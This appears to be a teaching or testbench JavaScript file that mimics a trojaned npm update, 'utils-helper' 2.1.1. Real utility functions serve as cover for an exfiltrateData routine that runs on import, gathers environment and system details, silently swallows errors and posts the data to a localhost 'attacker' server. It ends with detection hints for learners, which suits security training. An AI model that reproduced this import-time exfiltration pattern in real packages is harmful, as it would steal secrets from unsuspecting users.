/**
 * MALICIOUS UPDATE: utils-helper
 * Version 2.1.1
 * 
 * This is a malicious update that includes:
 * - Legitimate bug fixes (to appear normal)
 * - Hidden malicious code (for educational purposes)
 * 
 * SAFETY FEATURES:
 * - Only works when TESTBENCH_MODE=enabled
 * - Only sends data to localhost
 * - Clearly marked as malicious
 */

const http = require('http');

// ============================================================================
// MALICIOUS CODE SECTION - FOR EDUCATIONAL PURPOSES ONLY
// ============================================================================

/**
 * Exfiltrate data to attacker's server
 * SAFETY: Only works in testbench mode and sends to localhost
 */
function exfiltrateData() {
  // SAFETY CHECK: Only run in testbench environment
  if (process.env.TESTBENCH_MODE !== 'enabled') {
    return;
  }

  console.log('[TESTBENCH] Simulating data exfiltration from update...');

  // Collect data (in real attacks, this could be credentials, API keys, etc.)
  const dataToExfiltrate = {
    timestamp: new Date().toISOString(),
    updateVersion: '2.1.1',
    environment: {
      NODE_ENV: process.env.NODE_ENV,
      PWD: process.env.PWD,
      USER: process.env.USER,
      // Real attacks might look for: AWS_SECRET_KEY, DATABASE_PASSWORD, etc.
    },
    system: {
      platform: process.platform,
      nodeVersion: process.version,
      cwd: process.cwd()
    },
    package: {
      name: 'utils-helper',
      version: '2.1.1',
      updatedAt: new Date().toISOString()
    }
  };

  // SAFETY: Only send to localhost (mock attacker server)
  const payload = JSON.stringify(dataToExfiltrate);
  const options = {
    hostname: 'localhost',
    port: 3000,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  };

  const req = http.request(options, (res) => {
    console.log('[TESTBENCH] Update data exfiltration simulated');
  });

  req.on('error', (e) => {
    // Silently fail to avoid raising suspicion
  });

  req.write(payload);
  req.end();
}

// Execute malicious payload on module load (common technique)
// This runs automatically when the package is imported
try {
  exfiltrateData();
} catch (e) {
  // Silently catch errors to avoid detection
}

// ============================================================================
// LEGITIMATE CODE SECTION - Includes real bug fixes
// ============================================================================
// This is crucial: The update must work as expected to avoid suspicion

class UtilsHelper {
  /**
   * Format a date string
   * @param {Date} date - Date object to format
   * @param {string} format - Format string
   * @returns {string} Formatted date
   */
  static formatDate(date, format = 'YYYY-MM-DD') {
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, '0');
    const day = String(date.getDate()).padStart(2, '0');
    
    return format
      .replace('YYYY', year)
      .replace('MM', month)
      .replace('DD', day);
  }

  /**
   * Deep clone an object
   * BUG FIX: Now handles circular references
   * @param {object} obj - Object to clone
   * @returns {object} Cloned object
   */
  static deepClone(obj) {
    // FIX: Handle circular references
    const seen = new WeakSet();
    return JSON.parse(JSON.stringify(obj, (key, val) => {
      if (typeof val === 'object' && val !== null) {
        if (seen.has(val)) {
          return '[Circular]';
        }
        seen.add(val);
      }
      return val;
    }));
  }

  /**
   * Debounce a function
   * BUG FIX: Now preserves 'this' context
   * @param {Function} func - Function to debounce
   * @param {number} wait - Wait time in milliseconds
   * @returns {Function} Debounced function
   */
  static debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
      const later = () => {
        clearTimeout(timeout);
        func.apply(this, args); // FIX: Preserve 'this' context
      };
      clearTimeout(timeout);
      timeout = setTimeout(later, wait);
    };
  }

  /**
   * Validate email address
   * @param {string} email - Email to validate
   * @returns {boolean} True if valid
   */
  static isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  }

  /**
   * Generate a random string
   * @param {number} length - Length of string
   * @returns {string} Random string
   */
  static randomString(length = 10) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  /**
   * Sleep for specified milliseconds
   * @param {number} ms - Milliseconds to sleep
   * @returns {Promise} Promise that resolves after sleep
   */
  static sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  /**
   * NEW FEATURE: Format currency
   * This is a legitimate new feature that hides the malicious code
   * @param {number} amount - Amount to format
   * @param {string} currency - Currency code (default: USD)
   * @returns {string} Formatted currency string
   */
  static formatCurrency(amount, currency = 'USD') {
    return new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: currency
    }).format(amount);
  }
}

module.exports = UtilsHelper;

// ============================================================================
// DETECTION HINTS FOR LEARNERS:
// ============================================================================
// Red flags to look for when reviewing this update:
// 1. Network requests on module load (not in original version)
// 2. Access to process.env (environment variables)
// 3. Data collection and transmission
// 4. Code execution on import (before any function is called)
// 5. Suspicious function names like "exfiltrateData"
// 6. New features that seem unnecessary
// 
// In real attacks, these would be heavily obfuscated:
// - Variable names would be meaningless
// - Code would be minified or encoded
// - Network requests would be hidden in async operations
// - Timing attacks (delay execution to avoid immediate detection)
// ============================================================================

